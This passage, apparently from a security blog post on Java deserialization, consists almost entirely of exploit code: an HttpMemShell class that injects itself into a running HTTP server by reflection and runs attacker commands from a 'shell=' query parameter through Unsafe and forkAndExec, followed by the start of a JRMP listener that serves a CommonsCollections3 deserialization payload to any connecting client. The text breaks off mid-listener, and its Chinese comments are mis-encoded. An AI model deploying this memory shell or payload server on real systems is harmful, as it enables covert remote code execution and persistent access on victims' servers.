java.io.OutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HttpMemShell</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HttpHandler</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(HttpExchange httpExchange)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">query</span> <span class="hljs-operator">=</span> httpExchange.getRequestURI().getQuery();<br>        String[] split = query.split(<span class="hljs-string">&quot;=&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SUCCESS&quot;</span>+<span class="hljs-string">&quot;\n&quot;</span>;<br>        <span class="hljs-keyword">if</span> (split[<span class="hljs-number">0</span>].equals(<span class="hljs-string">&quot;shell&quot;</span>)) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> split[<span class="hljs-number">1</span>];<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                inputStream = execCmd(cmd);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125;<br>            <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">int</span> flag=-<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">while</span>((flag=inputStream.read(bytes))!=-<span class="hljs-number">1</span>)&#123;<br>                byteArrayOutputStream.write(bytes,<span class="hljs-number">0</span>,flag);<br>            &#125;<br>            response += byteArrayOutputStream.toString();<br>            byteArrayOutputStream.close();<br>        &#125;<br>        httpExchange.sendResponseHeaders(<span class="hljs-number">200</span>,response.length());<br>        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> httpExchange.getResponseBody();<br>        outputStream.write(response.getBytes());<br>        outputStream.close();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HttpMemShell</span><span class="hljs-params">()</span>&#123; <span class="hljs-comment">//publicå’Œdefaultçš„åŒºåˆ« publicå¯¹æ‰€æœ‰ç±»å¯è§;defaultå¯¹åŒä¸€ä¸ªåŒ…å†…å¯è§;templatlmplé»˜è®¤å®ä¾‹åŒ–ä½¿ç”¨public memshell()</span><br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">ThreadGroup</span> <span class="hljs-variable">threadGroup</span> <span class="hljs-operator">=</span> Thread.currentThread().getThreadGroup();<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">threadsFeld</span> <span class="hljs-operator">=</span> threadGroup.getClass().getDeclaredField(<span class="hljs-string">&quot;threads&quot;</span>);<br>            threadsFeld.setAccessible(<span class="hljs-literal">true</span>);<br>            Thread[] threads = (Thread[])threadsFeld.get(threadGroup);<br>            <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> threads[<span class="hljs-number">1</span>];<br><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">targetField</span> <span class="hljs-operator">=</span> thread.getClass().getDeclaredField(<span class="hljs-string">&quot;target&quot;</span>);<br>            targetField.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> targetField.get(thread);<br><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">this$0Field</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(<span class="hljs-string">&quot;this$0&quot;</span>);<br>            <span class="hljs-built_in">this</span>$0Field.setAccessible(<span class="hljs-literal">true</span>);<br>            object = <span class="hljs-built_in">this</span>$0Field.get(object);<br><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">contextsField</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(<span class="hljs-string">&quot;contexts&quot;</span>);<br>            contextsField.setAccessible(<span class="hljs-literal">true</span>);<br>            object = contextsField.get(object);<br><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">listField</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(<span class="hljs-string">&quot;list&quot;</span>);<br>            listField.setAccessible(<span class="hljs-literal">true</span>);<br>            java.util.<span class="hljs-type">LinkedList</span> <span class="hljs-variable">linkedList</span> <span class="hljs-operator">=</span> (java.util.LinkedList)listField.get(object);<br>            object = linkedList.get(<span class="hljs-number">0</span>);<br><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">handlerField</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(<span class="hljs-string">&quot;handler&quot;</span>);<br>            handlerField.setAccessible(<span class="hljs-literal">true</span>);<br>            handlerField.set(object,<span class="hljs-built_in">this</span>);<br>        &#125;<span class="hljs-keyword">catch</span>(Exception exception)&#123;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> InputStream <span class="hljs-title function_">execCmd</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>            String[] command=cmd.split(<span class="hljs-string">&quot; &quot;</span>);<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">theUnsafeField</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>            theUnsafeField.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) theUnsafeField.get(<span class="hljs-literal">null</span>);<br><br>            <span class="hljs-type">Class</span> <span class="hljs-variable">processClass</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                processClass = Class.forName(<span class="hljs-string">&quot;java.lang.UNIXProcess&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>                processClass = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>);<br>            &#125;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">processObject</span> <span class="hljs-operator">=</span> unsafe.allocateInstance(processClass);<br>            <span class="hljs-type">byte</span>[][] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[command.length - <span class="hljs-number">1</span>][];<br>            <span class="hljs-type">int</span>      <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> args.length; <span class="hljs-comment">// For added NUL bytes</span><br><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; args.length; i++) &#123;<br>                args[i] = command[i + <span class="hljs-number">1</span>].getBytes();<br>                size += args[i].length;<br>            &#125;<br><br>            <span class="hljs-type">byte</span>[] argBlock = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[size];<br>            <span class="hljs-type">int</span>    <span class="hljs-variable">i</span>        <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span>[] arg : args) &#123;<br>                System.arraycopy(arg, <span class="hljs-number">0</span>, argBlock, i, arg.length);<br>                i += arg.length + <span class="hljs-number">1</span>;<br>                <span class="hljs-comment">// No need to write NUL bytes explicitly</span><br>            &#125;<br>            <span class="hljs-type">int</span>[] envc                 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];<br>            <span class="hljs-type">int</span>[] std_fds              = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>&#125;;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">launchMechanismField</span> <span class="hljs-operator">=</span> processClass.getDeclaredField(<span class="hljs-string">&quot;launchMechanism&quot;</span>);<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">helperpathField</span>      <span class="hljs-operator">=</span> processClass.getDeclaredField(<span class="hljs-string">&quot;helperpath&quot;</span>);<br>            launchMechanismField.setAccessible(<span class="hljs-literal">true</span>);<br>            helperpathField.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">launchMechanismObject</span> <span class="hljs-operator">=</span> launchMechanismField.get(processObject);<br>            <span class="hljs-type">byte</span>[] helperpathObject      = (<span class="hljs-type">byte</span>[]) helperpathField.get(processObject);<br><br>            <span class="hljs-type">int</span> <span class="hljs-variable">ordinal</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) launchMechanismObject.getClass().getMethod(<span class="hljs-string">&quot;ordinal&quot;</span>).invoke(launchMechanismObject);<br><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">forkMethod</span> <span class="hljs-operator">=</span> processClass.getDeclaredMethod(<span class="hljs-string">&quot;forkAndExec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<br>                    <span class="hljs-type">int</span>.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class,<br>                    <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>[].class, <span class="hljs-type">boolean</span>.class<br>            &#125;);<br><br>            forkMethod.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-comment">// è®¾ç½®è®¿é—®æƒé™</span><br><br>            <span class="hljs-type">int</span> <span class="hljs-variable">pid</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) forkMethod.invoke(processObject, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<br>                    ordinal + <span class="hljs-number">1</span>, helperpathObject, toCString(command[<span class="hljs-number">0</span>]), argBlock, args.length,<br>                    <span class="hljs-literal">null</span>, envc[<span class="hljs-number">0</span>], <span class="hljs-literal">null</span>, std_fds, <span class="hljs-literal">false</span><br>            &#125;);<br><br>            <span class="hljs-comment">// åˆå§‹åŒ–å‘½ä»¤æ‰§è¡Œç»“æœï¼Œå°†æœ¬åœ°å‘½ä»¤æ‰§è¡Œçš„è¾“å‡ºæµè½¬æ¢ä¸ºç¨‹åºæ‰§è¡Œç»“æœçš„è¾“å‡ºæµ</span><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">initStreamsMethod</span> <span class="hljs-operator">=</span> processClass.getDeclaredMethod(<span class="hljs-string">&quot;initStreams&quot;</span>, <span class="hljs-type">int</span>[].class);<br>            initStreamsMethod.setAccessible(<span class="hljs-literal">true</span>);<br>            initStreamsMethod.invoke(processObject, std_fds);<br><br>            <span class="hljs-comment">// è·å–æœ¬åœ°æ‰§è¡Œç»“æœçš„è¾“å…¥æµ</span><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">getInputStreamMethod</span> <span class="hljs-operator">=</span> processClass.getMethod(<span class="hljs-string">&quot;getInputStream&quot;</span>);<br>            getInputStreamMethod.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> (InputStream) getInputStreamMethod.invoke(processObject);<br>            <span class="hljs-keyword">return</span> in;<br>        &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] toCString(String s) &#123;<br>        <span class="hljs-keyword">if</span> (s == <span class="hljs-literal">null</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">byte</span>[] bytes  = s.getBytes();<br>        <span class="hljs-type">byte</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[bytes.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(bytes, <span class="hljs-number">0</span>,<br>                result, <span class="hljs-number">0</span>,<br>                bytes.length);<br>        result[result.length - <span class="hljs-number">1</span>] = (<span class="hljs-type">byte</span>) <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>JRMPListener.java</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.io.BufferedInputStream;<br><span class="hljs-keyword">import</span> java.io.BufferedOutputStream;<br><span class="hljs-keyword">import</span> java.io.DataInputStream;<br><span class="hljs-keyword">import</span> java.io.DataOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectStreamClass;<br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.net.*;<br><span class="hljs-keyword">import</span> java.rmi.MarshalException;<br><span class="hljs-keyword">import</span> java.rmi.server.ObjID;<br><span class="hljs-keyword">import</span> java.rmi.server.UID;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> sun.rmi.transport.TransportConstants;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Generic JRMP listener</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Opens up an JRMP listener that will deliver the specified payload to any</span><br><span class="hljs-comment"> * client connecting to it and making a call.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> mbechler</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@SuppressWarnings</span> ( &#123;<br>        <span class="hljs-string">&quot;restriction&quot;</span><br>&#125; )<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JRMPListener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> port;<br>    <span class="hljs-keyword">private</span> Object payloadObject;<br>    <span class="hljs-keyword">private</span> ServerSocket ss;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">Object</span> <span class="hljs-variable">waitLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> exit;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> hadConnection;<br>    <span class="hljs-keyword">private</span> URL classpathUrl;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">JRMPListener</span> <span class="hljs-params">( <span class="hljs-type">int</span> port, Object payloadObject )</span> <span class="hljs-keyword">throws</span> NumberFormatException, IOException &#123;<br>        <span class="hljs-built_in">this</span>.port = port;<br>        <span class="hljs-built_in">this</span>.payloadObject = payloadObject;<br>        <span class="hljs-built_in">this</span>.ss = ServerSocketFactory.getDefault().createServerSocket(<span class="hljs-built_in">this</span>.port);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">JRMPListener</span> <span class="hljs-params">(<span class="hljs-type">int</span> port, String className, URL classpathUrl)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">this</span>.port = port;<br>        <span class="hljs-built_in">this</span>.payloadObject = makeDummyObject(className);<br>        <span class="hljs-built_in">this</span>.classpathUrl = classpathUrl;<br>        <span class="hljs-built_in">this</span>.ss = ServerSocketFactory.getDefault().createServerSocket(<span class="hljs-built_in">this</span>.port);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">waitFor</span> <span class="hljs-params">( <span class="hljs-type">int</span> i )</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">this</span>.hadConnection ) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            System.err.println(<span class="hljs-string">&quot;Waiting for connection&quot;</span>);<br>            <span class="hljs-keyword">synchronized</span> ( <span class="hljs-built_in">this</span>.waitLock ) &#123;<br>                <span class="hljs-built_in">this</span>.waitLock.wait(i);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.hadConnection;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( InterruptedException e ) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span> <span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.exit = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">this</span>.ss.close();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( IOException e ) &#123;&#125;<br>        <span class="hljs-keyword">synchronized</span> ( <span class="hljs-built_in">this</span>.waitLock ) &#123;<br>            <span class="hljs-built_in">this</span>.waitLock.notify();<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String[] args )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-keyword">if</span> ( args.length &lt; <span class="hljs-number">1</span> ) &#123;<br>            System.err.println(JRMPListener.class.getName() + <span class="hljs-string">&quot; &lt;port&gt;&quot;</span>);<br>            System.exit(-<span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">payloadObject</span> <span class="hljs-operator">=</span> CC3.getObject();<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> Integer.parseInt(args[ <span class="hljs-number">0</span> ]);<br>            System.err.println(<span class="hljs-string">&quot;* Opening JRMP listener on &quot;</span> + port);<br>            <span class="hljs-type">JRMPListener</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRMPListener</span>(port, payloadObject);<br>            c.run();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            System.err.println(<span class="hljs-string">&quot;Listener error&quot;</span>);<br>            e.printStackTrace(System.err);<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span> <span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Socket</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">while</span> ( !<span class="hljs-built_in">this</span>.exit &amp;&amp; ( s = <span class="hljs-built_in">this</span>.ss.accept() ) != <span class="hljs-literal">null</span> ) &#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        s.setSoTimeout(<span class="hljs-number">5000</span>);<br>                        <span class="hljs-type">InetSocketAddress</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> (InetSocketAddress) s.getRemoteSocketAddress();<br>                        System.err.println(<span class="hljs-string">&quot;Have connection from &quot;</span> + remote);<br><br>                        <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> s.getInputStream();<br>                        <span class="hljs-type">InputStream</span> <span class="hljs-variable">bufIn</span> <span class="hljs-operator">=</span> is.markSupported() ? is : <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(is);<br><br>                        <span class="hljs-comment">// Read magic (or HTTP wrapper)</span><br>                        bufIn.mark(<span class="hljs-number">4</span>);<br>                        <span class="hljs-type">DataInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataInputStream</span>(bufIn);<br>                        <span class="hljs-type">int</span> <span class="hljs-variable">magic</span> <span class="hljs-operator">=</span> in.readInt();<br><br>                        <span class="hljs-type">short</span> <span class="hljs-variable">version</span> <span class="hljs-operator">=</span> in.readShort();<br>                        <span class="hljs-keyword">if</span> ( magic != TransportConstants.Magic || version != TransportConstants.Version ) &#123;<br>                            